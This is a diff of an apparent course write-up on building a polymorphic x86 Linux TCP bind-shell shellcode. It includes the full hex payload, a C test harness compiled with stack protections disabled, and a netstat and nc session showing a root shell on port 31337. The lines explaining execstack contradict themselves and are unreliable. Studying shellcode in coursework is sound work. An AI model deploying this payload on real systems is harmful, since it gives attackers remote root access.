@@ -29,13 +29,14 @@ sub eax, eax             ; Clears the EAX Register
 ```
 
 The first shellcode I modified was `tcpbindshell (108 bytes)`, created by Russell Willis.  
-This shellcode can be found at `http://shell-storm.org/shellcode/files/shellcode-847.php`.  
++ This shellcode can be found at `http://shell-storm.org/shellcode/files/shellcode-847.php`.  
 
 Our assignment required that our polymorphic version of the shellcode to not exceed 150% of the original value.   
 + The original shellcode length is 108 bytes. 
 + The final length of this polymorphic shellcode is 144 bytes.    
 
 ## Polymorphic Shellcode
++ The code I added/modified is indented with one space.
 ```nasm
 global _start
 _start:
@@ -122,7 +123,6 @@ int    0x80       ; System Call
 ```  
 
 + To push the filename string `//bin/sh` onto the stack, I used the MMX registers.   
-+ The code I added/modified is indented with one space.
 
 ### Compiling the Shellcode
 ```console
@@ -148,9 +148,10 @@ sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
 I loaded it into our shellcode testing program to ensure it still worked when injected into a host program.  
 
 ```c
+// Filename: shellcode.c
+// Author:   boku
 #include<stdio.h>
 #include<string.h>
-
 unsigned char code[] = \
 "\x31\xc9\xf7\xe1\x89\xc3\x6a\x66\x5f\x89\xf8\x43\x52\x6a\x06\x53\x6a\x02"
 "\x89\xe1\xcd\x80\x96\x89\xf8\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a"
@@ -160,7 +161,6 @@ unsigned char code[] = \
 "\xc0\x0f\x73\xf0\x20\xbb\xd0\xd0\x9d\x96\x0f\x6e\xcb\x0f\xfc\xc1\x0f\x6e"
 "\xca\x0f\x73\xf1\x20\x0f\x6e\xd2\x0f\xfc\xca\x0f\xef\xc1\x83\xec\x08\x0f"
 "\x7f\x04\x24\x31\xc0\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";
-
 main()
 {
         printf("Shellcode Length:  %d\n", strlen(code));
@@ -168,13 +168,34 @@ main()
         ret();
 }
 ```
-
-I then compiled the C program.  
++ I then compiled the C program.  
 
 #### Compiling the Host Program
 ```console
 gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
 ```
++ we use the feature `no-stack-protector` to disable canary stack protections that are automattically added when using the gcc compiler.
++ The option `execstack` disables the Data Execution Protection (DEP) mechanism automatically added when compiling with gcc. 
+  - This makes the stack non-executable.
+  - The stack would be only read and write if we didn't disable this.
+
+### Testing the Polymorphic Shellcode
+#### Window 1
+```console
+root# ./shellcode
+Shellcode Length:  144
+```
+
+#### Window 2
+```console
+root# netstat -tnalp | grep shellcode
+tcp        0      0 0.0.0.0:31337           0.0.0.0:*               LISTEN      19649/shellcode
+root# nc 127.0.0.1 31337
+whoami
+root
+```
++ Awesome! Our version of the shellcode works as intended.
++ Having no `root#` or `user$` is typical of bind shells.
 
 
 
